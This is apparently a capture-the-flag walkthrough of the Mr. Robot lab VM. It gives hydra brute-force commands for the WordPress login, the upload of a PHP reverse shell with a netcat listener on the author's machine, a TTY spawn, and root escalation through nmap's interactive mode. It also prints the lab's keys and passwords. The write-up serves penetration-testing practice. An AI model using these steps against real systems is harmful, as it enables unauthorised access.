		<p>First things first:</p>

		<p>Starting by the /robots.txt was a good guess in the MrRobot VM, and there i got the path to the first key: /key-1-of-3.txt</p>
		<p>Key1: 073403c8a58a1f80d943455fb30724b9</p>
		<p></p>
		<p>Had an extra file there too, which i saved and took a peek</p>
		<p>It had more than 80k lines, with a lot of them repeated, so pass through uniq and it resulted in 11k lines, which didnt look too promising.</p>
		<p></p>
		<p>Ran a scan with nikto, who showed that /wp-login existed, and returned Invalid username, which we can guess by a bruteforce attack a valid login. </p>
		<p></p>
		<p>From an cookie peek with BURP, we could see that payload of post included a line with log=username&amp;pwd=pass&amp;wp-submit=Log+In, which tells to us that this is what we need to pass in a post form, if we want to try a bruteforce</p>
		<p></p>
		<p>With an start point by the file with previously got, began an attack with hydra, to bruteforce and get a valid username</p>
		<p></p>
		<p>hydra -vV -L file -p fk 192.168.100.75 http-post-form '/wp-login.php:log=^USER^&amp;pwd=^PASS^&amp;wp-submit=Log+In:F=Invalid username'</p>
		<p></p>
		<p>Explaining the command:</p>
		<p></p>
		<p>-vV to verbose attack</p>
		<p>-L to test logins from a file</p>
		<p>-p to pass a unique password to be tested, we dont care about the pass first, we need a valid login to begin</p>
		<p>192.168.100.75 is the ip of the vm in my netwrk</p>
		<p>http-post-form telling what we're trying to brute force, in this case a http post form</p>
		<p>'/wp-login.php:log=^USER^&amp;pwd=^PASS^*wp-submit=Log+In:F=Invalid username' the payload, basically before the first ":" is the path where the form is located, after that is the post parameters, which we got from BURP and made substitutions with "^USER^" and "^PASS^", and after the 2nd ":", is the failure condition of an attempt, which must contain "Invalid username" in the response.</p>
		<p></p>
		<p>After a while, the attack completes and we get a viable username: elliot</p>
		<p></p>
		<p>Time to run the command again, this time with the username value "elliot" and the file in the pass field, dont forgeting to change the failure message</p>
		<p></p>
		<p>hydra -vV -l elliot -P a 192.168.100.75 http-post-form '/wp-login.php:log=^USER^&amp;pwd=^PASS^&amp;wp-submit=Log+In:F=is incorrect'	</p>
		<p>And boom, we got the password: ER28-0652</p>
		<p>Logging in the page, we got access to the wordpress panel, and from here we can upload a reverse shell exploit, to get us a shell in the server</p>
		<p>Got one from http://pentestmonkey.net/tools/web-shells/php-reverse-shell</p>
		<p>Changed the config to my machine ip and port 9999, uploaded the php file to Media/Add New, put netcat to listen on my machine with 'nc -l -v -n -p 9999 and opened the exploit directory, getting a shell</p>
		<p>Next step is spawning a terminal from the shell</p>
		<p>Accomplished by python -c "import pty; pty.spawn('/bin/bash');"</p>
		<p>Now time to see in what we're into.. First step was to ls, a lot of directories there, and not interesting for us.. then went to /home, there found robot directory, which had key-2-of-3.txt and password.raw-md5 inside.. no permissions to open key-2, but can open password raw, which got us a md5 hash.</p>
		<p>went to crackstation.net and cracked the hash, which resulted in abcdefghijklmnopqrstuvwxyz, the password for robot user.</p>
		<p>Back to the terminal we got, made su robot and inserted the pass</p>
		<p>Now we have the permissions to open key2, which is 822c73956184f694993bede3eb39f959</p>
		<p>Objective now is privilege escalation.. with command find / -user root -perm -4000 -print 2&gt;/dev/null we find all programs with setuid in the system</p>
		<p>one particular is from a list that allow privilege escalation, nmap</p>
		<p>Nmap from versions 2.02 to 5.21 have an interactive mode, which allow users to execute shell commands.. the nmap from the VM is version 3.81, thus allowing us to do it.</p>
		<p>To enter in nmap interactive mode just "nmap --interactive". once inside, !sh then spawning a shell</p>
		<p>First thing after spawning shell, went to /root and saw what's there, and it's the last key..</p>
